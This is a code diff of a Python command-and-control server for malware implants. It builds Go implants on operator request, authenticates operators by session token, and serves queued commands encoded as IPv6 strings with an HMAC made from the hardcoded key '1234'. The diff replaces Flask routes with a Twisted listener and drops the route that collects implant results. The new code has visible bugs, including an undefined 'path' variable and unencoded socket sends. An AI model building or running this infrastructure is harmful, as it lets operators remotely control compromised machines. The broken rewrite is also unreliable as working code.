@@ -1,3 +1,13 @@
+import json
+import hashlib
+import hmac
+import signal
+
+from twisted.web.http import urlparse
+from twisted.web.server import Site
+from twisted.web.resource import Resource
+from twisted.internet import reactor, defer
+from twisted.web import http
 import hashlib
 import hmac
 import json
@@ -82,30 +92,18 @@ def build_implant(protocol):
     :param protocol: The protocol to communicate over
     :return: bool depending on build success
     """
-    logger.info("building implant")
     match protocol:
         case "http":
             try:
-                result = subprocess.run(
-                    ["go", "build", "-tags", "http", "./http"],
-                    cwd='./implant',
-                    check=True,
-                    capture_output=True,
-                    text=True
-                )
-                logger.info("success building")
-                print(result)
+                os.chdir("./implant")
+                subprocess.run(["go", "build", "-tags", "http", "./http"], check=True, capture_output=True, text=True)
                 return True
             except subprocess.CalledProcessError as e:
                 logger.error(f"error building: {e}")
-                logger.error(f"stdout: {e.stdout}")
-                logger.error(f"stderr: {e.stderr}")
                 return False
             except Exception as e:
                 logger.error(f"general exception occurred: {e}")
                 return False
-        case _:
-            logger.error("no case match found")
 
 
 def add_user(new_user_id):
@@ -257,12 +255,11 @@ def handle_client(client_socket):
                 request_type, uname, token, *message = client_request.split(" ", 3)
                 logger.info(f"checking session token")
                 if token in operator_session_tokens:
-                    bld_status = build_implant(message[0])
-                    print(bld_status)
+                    bld_status = build_implant(message)
                     if bld_status is True:
-                        client_socket.send("Building implant succeeded!".encode())
+                        client_socket.send("Building implant succeeded!")
                     else:
-                        client_socket.send("Building implant failed...".encode())
+                        client_socket.send("Building implant failed...")
                 else:
                     client_socket.send(f"Bad token\n".encode())
                     logger.error("bad token")
@@ -272,136 +269,73 @@ def handle_client(client_socket):
                 client_socket.send("Unknown command\n".encode())
 
     except Exception as e:
-        logger.error(f"Error occurred when trying to receive connection: {e}")
-        client_socket.send(f"Error: {e}\n".encode())
+        logger.error(f"Error occurred when trying to receive connection {e}")
     finally:
         client_socket.close()
 
 
-@app.route('/auth/<path:path>', methods=['GET'])
-def authenticated_get(path):
-    """
-    Verifies requests for commands with an HMAC and shared key
-    :param path: This represents the implant ID
-    :return: Either the waiting command or error
-    """
-    rcv_token = request.args.get("token")
-    rcv_timestamp = request.args.get("timestamp")
-    # Get the message FIFO
-    logger.info("GET incoming for authenticated listener URI")
-    if verify_auth_token(path, rcv_token, rcv_timestamp) is True:
-        try:
-            operator, command = get_waiting_command(path)
-            if operator and command is False:
-                logger.error("operator and command in queue returned as false")
-                return "error"
-            checkout_command(path, operator)
-            command = json.dumps(ipv6_encoder.string_to_ipv6(command))
-            logger.info("sending command and HMAC to implant")
-            hmac_k = hmac.new("1234".encode(), command.encode(), hashlib.sha256)
-            hmac_sig = hmac_k.hexdigest()
-            return jsonify(
-                message=command,
-                key=hmac_sig
-            )
-        except Exception as e:
-            logger.error(f"error: {e}")
-            return "error"
-    else:
-        logger.error(f"error: verify_auth_token failed")
-        return "error"
+class AuthenticatedListener(Resource):
+    isLeaf = True  # This resource will handle the GET requests directly
+
+    def render_GET(self, twisted_req):
+        # Parse the path segment after "/auth/"
+
+        print(path)
+        rcv_token = twisted_req.args.get(b"token", [None])[0]
+        rcv_timestamp = twisted_req.args.get(b"timestamp", [None])[0]
+
+        # Log the request
+        logger.info("GET incoming for authenticated listener URI")
+
+        # Verify token
+        if verify_auth_token(path, rcv_token, rcv_timestamp):
+            try:
+                operator, command = get_waiting_command(path)
+                if operator and command is False:
+                    logger.error("Operator and command in queue returned as false")
+                    twisted_req.setResponseCode(http.INTERNAL_SERVER_ERROR)
+                    return b"error"
+
+                checkout_command(path, operator)
+                command_json = json.dumps(ipv6_encoder.string_to_ipv6(command))
+                logger.info("sending command and HMAC to implant")
+
+                # Generate HMAC
+                hmac_k = hmac.new(b"1234", command_json.encode(), hashlib.sha256)
+                hmac_sig = hmac_k.hexdigest()
+
+                # Prepare JSON response
+                response_data = {
+                    "message": command_json,
+                    "key": hmac_sig
+                }
+                response_json = json.dumps(response_data)
+
+                # Set headers and return response
+                twisted_req.setHeader(b"Content-Type", b"application/json")
+                return response_json.encode()
+
+            except Exception as e:
+                logger.error(f"Error: {e}")
+                twisted_req.setResponseCode(http.INTERNAL_SERVER_ERROR)
+                return b"error"
+        else:
+            logger.error("Error: verify_auth_token failed")
+            twisted_req.setResponseCode(http.UNAUTHORIZED)
+            return b"error"
 
 
-@app.route('/direct/<path:path>', methods=['GET'])
-def http_get(path):
-    """
-    Handles implants skipping the CF Worker and using basic HTTP for check-in
-    :param path: This represents the implant ID
-    :return: Either the waiting command or error
-    """
-    # Get the message FIFO
-    logger.info("GET incoming for basic HTTP listener URI")
-    try:
-        operator, command = get_waiting_command(path)
-        if operator and command is False:
-            logger.error("error")
-            return "error"
-        checkout_command(path, operator)
-        command = json.dumps(ipv6_encoder.string_to_ipv6(command))
-        logger.info("sending command and HMAC to implant")
-        hmac_k = hmac.new("1234".encode(), command.encode(), hashlib.sha256)
-        hmac_sig = hmac_k.hexdigest()
-        return jsonify(
-            message=command,
-            key=hmac_sig
-        )
-    except Exception as e:
-        logger.error(f"error: {e}")
-        return "error"
+# Function to start the Twisted server in a separate thread
+def start_twisted():
+    root = Resource()
+    root.putChild(b"auth", AuthenticatedListener())
+    factory = Site(root)
+    reactor.listenTCP(5000, factory)
+    reactor.run(installSignalHandlers=False)  # Avoid blocking signal handling
 
 
-@app.route('/<path:path>', methods=['GET'])
-def catch_all_get(path):
-    """
-    Handles the CF JS worker script getting waiting commands in IPv6 format
-    :param path: This represents the implant ID
-    :return: Either the waiting command or error
-    """
-    # Get the message FIFO
-    logger.info("GET incoming for DNS URI path")
-    try:
-        operator, command = get_waiting_command(path)
-        if operator and command is False:
-            logger.error("error")
-            return "error"
-        checkout_command(path, operator)
-        logger.info("sending IPv6 encoded command to CF worker")
-        return ipv6_encoder.string_to_ipv6(command)
-    except Exception as e:
-        logger.error(f"error: {e}")
-        return "error"
-
-
-@app.route('/<path:path>', methods=['POST'])
-def catch_all_post(path):
-    """
-    Implants either directly or through the CF worker send results here
-    POSTS come in as JSON, need a msg field
-    Will eventually probably also use the HMAC to verify authenticity
-    :param path: This represents the implant ID
-    :return: Either 200 or error
-    """
-    try:
-        logger.info(f"{path} sending us data")
-        # Get the data
-        result = request.get_json()
-        # The result comes in as a JSON object under the field msg
-        result = result.get("msg")
-        # Check which operator is waiting for a result
-        queue = implant_checkout[path]
-        logger.info("got queue for operator")
-        operator = queue.get()
-        logger.info(f"sending {operator} command")
-        decoded_res = ipv6_encoder.ipv6_to_string(result.split("\n"))
-        handle_update(operator, path, decoded_res)
-        return "200"
-    except Exception as e:
-        logger.error(f"error getting data: {e}")
-        return "error"
-
-
-def start_flask():
-    app.run()
-
-
-def start_server():
-    """
-    Start the socket server and the flask server
-    Run an infinite loop until cancelled to handle socket requests
-    :return: Nothing
-    """
-    flask_thread = Thread(target=start_flask)
-    flask_thread.start()
+# Socket server setup
+def start_socket_server():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(('0.0.0.0', 9999))  # Bind to any available interface
     server.listen(5)
@@ -410,10 +344,7 @@ def start_server():
     server_context.maximum_version = ssl.TLSVersion.TLSv1_3
     server_context.load_cert_chain(certfile="server.pem")
     server_context.verify_mode = ssl.CERT_NONE
-    secure_socket = server_context.wrap_socket(
-        server,
-        server_side=True,
-    )
+    secure_socket = server_context.wrap_socket(server, server_side=True)
     logger.info("TLS socket wrapped and starting on port 9999\n")
 
     while True:
@@ -421,6 +352,16 @@ def start_server():
         logger.info(f"Accepted connection from: {addr}")
         client_handler = threading.Thread(target=handle_client, args=(client_socket,))
         client_handler.start()
+
+
+# Function to start both servers
+def start_server():
+    # Start Twisted in a separate thread
+    twisted_thread = Thread(target=start_twisted)
+    twisted_thread.start()
+
+    # Start the socket server in the main thread
+    start_socket_server()
 
 
 if __name__ == "__main__":
